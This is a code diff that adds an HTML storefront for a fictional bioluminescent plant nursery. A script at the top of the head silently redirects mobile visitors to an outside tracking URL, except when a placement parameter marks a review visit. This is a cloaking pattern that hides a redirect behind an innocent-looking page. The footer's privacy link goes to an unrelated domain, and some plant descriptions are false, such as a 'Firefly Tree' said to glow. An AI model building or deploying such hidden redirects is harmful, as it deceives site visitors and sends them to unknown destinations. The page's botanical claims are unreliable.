@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LuminaFlora: Bioluminescent Plant Nursery</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Audiowide&family=Exo+2:wght@300;400;700&display=swap');
+        
+        :root {
+            --primary-color: #00FF00;
+            --secondary-color: #4B0082;
+            --background-color: #001F3F;
+            --text-color: #E0FFFF;
+        }
+        body {
+            font-family: 'Exo 2', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(135deg, #00FF00, #008000);
+            color: #001F3F;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .plant-card {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 255, 0, 0.2);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .plant-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 16px rgba(0, 255, 0, 0.3);
+        }
+        .plant-image {
+            height: 200px;
+            background-color: #002244;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #00FF00;
+            position: relative;
+            overflow: hidden;
+        }
+        .plant-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, #002244 150%);
+            opacity: 0.7;
+        }
+        .plant-info {
+            padding: 20px;
+        }
+        h1 {
+            font-family: 'Audiowide', cursive;
+            font-size: 3.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-family: 'Audiowide', cursive;
+            color: #00FF00;
+            margin-top: 0;
+            font-size: 1.8em;
+            text-shadow: 0 0 10px #00FF00;
+        }
+        p {
+            color: #B0E0E6;
+            line-height: 1.6;
+        }
+        .light-intensity {
+            font-weight: bold;
+            color: #00FFFF;
+            font-size: 0.9em;
+            margin-top: 15px;
+        }
+        .care-level {
+            background-color: #4B0082;
+            color: #00FF00;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .buy-button {
+            background-color: #00FF00;
+            color: #001F3F;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Exo 2', sans-serif;
+        }
+        .buy-button:hover {
+            background-color: #00FFFF;
+            transform: scale(1.05);
+        }
+        footer {
+            background: linear-gradient(135deg, #008000, #00FF00);
+            color: #001F3F;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #002244;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0, 255, 0, 0.1);
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: #00FF00;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+            font-family: 'Audiowide', cursive;
+        }
+        nav a:hover {
+            color: #00FFFF;
+            text-shadow: 0 0 10px #00FFFF;
+        }
+        footer a {
+            color: #001F3F;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>LuminaFlora</h1>
+        <p>Illuminate Your Space with Nature's Glow</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Our Plants</a></li>
+            <li><a href="#">Care Guide</a></li>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="plant-card">
+            <div class="plant-image">Glowing Mushrooms</div>
+            <div class="plant-info">
+                <h2>Neonothopanus gardneri</h2>
+                <p>Bioluminescent mushrooms that emit a soft green light in darkness.</p>
+                <span class="care-level">Intermediate Care</span>
+                <p class="light-intensity">Light Intensity: Moderate</p>
+                <button class="buy-button">Add to Garden</button>
+            </div>
+        </div>
+        <div class="plant-card">
+            <div class="plant-image">Firefly Tree</div>
+            <div class="plant-info">
+                <h2>Diphylleia grayi</h2>
+                <p>Rare tree with leaves that become transparent and glow in the rain.</p>
+                <span class="care-level">Expert Care</span>
+                <p class="light-intensity">Light Intensity: High</p>
+                <button class="buy-button">Add to Garden</button>
+            </div>
+        </div>
+        <div class="plant-card">
+            <div class="plant-image">Bioluminescent Algae</div>
+            <div class="plant-info">
+                <h2>Pyrocystis fusiformis</h2>
+                <p>Marine algae that produce a blue glow when agitated.</p>
+                <span class="care-level">Beginner Care</span>
+                <p class="light-intensity">Light Intensity: Low</p>
+                <button class="buy-button">Add to Garden</button>
+            </div>
+        </div>
+        <div class="plant-card">
+            <div class="plant-image">Glow Moss</div>
+            <div class="plant-info">
+                <h2>Schistostega pennata</h2>
+                <p>Cave-dwelling moss that reflects light, creating a luminous effect.</p>
+                <span class="care-level">Advanced Care</span>
+                <p class="light-intensity">Light Intensity: Very Low</p>
+                <button class="buy-button">Add to Garden</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 LuminaFlora Bioluminescent Plant Nursery. Bringing the magic of natural light to your home.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
